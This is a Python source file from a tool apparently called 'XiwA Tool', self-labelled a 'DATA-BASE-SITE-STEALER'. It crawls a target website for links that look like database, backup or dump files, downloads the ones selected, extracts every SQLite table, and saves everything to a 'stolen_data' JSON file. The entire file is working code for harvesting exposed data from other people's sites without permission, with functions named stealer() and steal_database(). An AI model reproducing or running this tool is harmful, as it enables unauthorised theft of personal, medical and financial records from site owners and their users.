"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

#DATA-BASE-SITE-STEALER

import requests
import json
import colorama
from colorama import Fore, Style, Back
import sqlite3
import pandas as pd
import os
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import concurrent.futures
import time

colorama.init()

blue_background = Back.BLUE + Fore.WHITE

def find_database_urls(html_content, base_url):
    soup = BeautifulSoup(html_content, 'html.parser')
    database_urls = set()
    
    db_patterns = [
        r'.*\.(db|sqlite|sqlite3|csv|sql|mdb|accdb|json|xml|bak|old|backup|dump|mysql|pgsql|oracle|mariadb|mongodb|couchdb|redis|neo4j|cassandra|hbase|riak|couchbase|orientdb|arangodb|influxdb|timescaledb|cockroachdb|yugabytedb|vitessdb|tidb|singlestore|clickhouse|questdb|scylladb|dgraph|faunadb|marklogic|ravendb|aerospike|voltdb|nuodb|foundationdb|cosmosdb|dynamodb|firestore|realm|objectbox|crate|cockroach|yugabyte|vitess|tikv|badger|boltdb|leveldb|rocksdb|wiredtiger|lmdb|sophia|vedis|unqlite|kyotocabinet|tokyocabinet|berkeleydb|hsqldb|h2|derby|firebird|interbase|paradox|dbase|foxpro|access|filemaker|4d|kexi|openoffice|libreoffice|excel|numbers|sheets|airtable|notion|coda|smartsheet|podio|zoho|quickbase|knack|caspio|bubble|outsystems|mendix|powerapps|appian|servicenow|salesforce|dynamics|netsuite|workday|oracle|sap|peoplesoft|jdedwards|sage|infor|epicor|syspro|ifs|deltek|acumatica|odoo|erpnext|dolibarr|tryton|axelor|metasfresh|idempiere|adempiere|openbravo|compiere|xtuple|gnu|health|hospital|os|bahmni|care2x|freemed|gnumed|hospitalrun|openmrs|openemr|oscar|vista|meditech|epic|cerner|allscripts|eclinicalworks|nextgen|athenahealth|kareo|practicesuite|advancedmd|drchrono|carecloud|webpt|therapynotes|simplepractice|cliniko|jane|writetrack|clinicsource|theranest|fusion|exact|tally|sage50|quickbooks|xero|freshbooks|wave|zohobooks|kashflow|freeagent|clearbooks|manager|gnucash|kmymoney|homebank|ledger|hledger|beancount|plaintextaccounting|ledger|cli|reckon|myob|saasu|brightpearl)$',
        r'.*database.*',
        r'.*\/db[\/\-_].*',
        r'.*\/data[\/\-_].*', 
        r'.*\/backup[\/\-_].*',
        r'.*\/dump[\/\-_].*',
        r'.*\/archive[\/\-_].*',
        r'.*\/export[\/\-_].*',
        r'.*\/import[\/\-_].*',
        r'.*\/sync[\/\-_].*',
        r'.*\/replicate[\/\-_].*',
        r'.*\/store[\/\-_].*',
        r'.*\/warehouse[\/\-_].*',
        r'.*\/lake[\/\-_].*',
        r'.*\/mart[\/\-_].*',
        r'.*\/vault[\/\-_].*',
        r'.*\/repo[\/\-_].*',
        r'.*\/storage[\/\-_].*',
        r'.*\/cache[\/\-_].*',
        r'.*\/temp[\/\-_].*'
    ]
    
    for link in soup.find_all(['a', 'link', 'script', 'img'], href=True):
        href = link.get('href', '')
        full_url = urljoin(base_url, href)
        
        for pattern in db_patterns:
            if re.match(pattern, href.lower(), re.IGNORECASE):
                database_urls.add(full_url)
                break
                
    for pattern in db_patterns:
        matches = re.findall(f'["\'](.*?{pattern}.*?)["\']', html_content, re.IGNORECASE)
        for match in matches:
            full_url = urljoin(base_url, match)
            database_urls.add(full_url)
            
    return list(database_urls)

def crawl_page(url, depth=2):
    visited = set()
    to_visit = {url}
    all_db_urls = set()
    
    while depth > 0 and to_visit:
        current_url = to_visit.pop()
        if current_url in visited:
            continue
            
        try:
            response = requests.get(current_url, timeout=10)
            if response.status_code == 200:
                visited.add(current_url)
                db_urls = find_database_urls(response.text, current_url)
                all_db_urls.update(db_urls)
                
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    new_url = urljoin(current_url, link['href'])
                    if new_url.startswith(url): 
                        to_visit.add(new_url)
                        
        except Exception:
            continue
            
        depth -= 1
        
    return list(all_db_urls)

def stealer():
    url = input(f"{blue_background}[>] Entrez l'URL du site web: {Style.RESET_ALL}")
    try:
        print(f"{Fore.CYAN}[*] Analyse approfondie du site...{Style.RESET_ALL}")
        database_urls = crawl_page(url)
        
        if not database_urls:
            print(f"{Fore.YELLOW}[!] Aucune base de données trouvée{Style.RESET_ALL}")
            return None
            
        print(f"{Fore.GREEN}[+] {len(database_urls)} bases de données potentielles trouvées:{Style.RESET_ALL}")
        for i, db_url in enumerate(database_urls, 1):
            print(f"{Fore.CYAN}[{i}] {db_url}{Style.RESET_ALL}")
            
        indices = input(f"{blue_background}[>] Entrez les numéros des bases à télécharger (séparés par des virgules) ou 'all' pour tout: {Style.RESET_ALL}")
        
        if indices.lower() == 'all':
            return database_urls
        else:
            selected_indices = [int(i.strip()) for i in indices.split(',')]
            return [database_urls[i-1] for i in selected_indices if 0 < i <= len(database_urls)]
            
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur lors de l'analyse du site: {e}{Style.RESET_ALL}")
        return None

def steal_database(urls):
    stolen_data = {}
    
    def process_url(url):
        try:
            response = requests.get(url, stream=True, timeout=30)
            if response.status_code == 200:
                if url.endswith('.csv'):
                    df = pd.read_csv(url)
                    return url, df.to_dict()
                elif url.endswith(('.db', '.sqlite', '.sqlite3')):
                    temp_file = f'temp_db_{hash(url)}.db'
                    with open(temp_file, 'wb') as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            f.write(chunk)
                    
                    conn = sqlite3.connect(temp_file)
                    cursor = conn.cursor()
                    tables = {}
                    
                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                    table_names = cursor.fetchall()
                    
                    for table in table_names:
                        cursor.execute(f"SELECT * FROM {table[0]}")
                        tables[table[0]] = cursor.fetchall()
                    
                    conn.close()
                    os.remove(temp_file)
                    return url, tables
                else:
                    return url, response.text
                    
        except Exception as e:
            print(f"{Fore.RED}[!] Erreur pour {url}: {e}{Style.RESET_ALL}")
            return url, None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_url = {executor.submit(process_url, url): url for url in urls}
        for future in concurrent.futures.as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result[1] is not None:
                    stolen_data[result[0]] = result[1]
                    print(f"{Fore.GREEN}[+] Base de données récupérée: {url}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Erreur pour {url}: {e}{Style.RESET_ALL}")
                
    return stolen_data

def save_database(database, filename):
    if database:
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(database, f, indent=4, ensure_ascii=False)
            print(f"{Fore.GREEN}[+] Données sauvegardées dans {filename}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Erreur lors de la sauvegarde: {e}{Style.RESET_ALL}")

def menu():
    while True:
        print(f"\n{Fore.WHITE}[1] Récupérer les données")
        print(f"{Fore.WHITE}[2] Quitter")
        choice = input(f"{Fore.WHITE}[>] Entrez votre choix: {Style.RESET_ALL}")
        if choice == "1":
            urls = stealer()
            if urls:
                data = steal_database(urls)
                if data:
                    filename = f"stolen_data_{int(time.time())}.json"
                    save_database(data, filename)
        elif choice == "2":
            print(f"{Fore.WHITE}[!] Quitter le programme{Style.RESET_ALL}")
            break
            exit()
        else:
            print(f"{Fore.RED}[!] Choix invalide{Style.RESET_ALL}")

if __name__ == "__main__":
    menu() 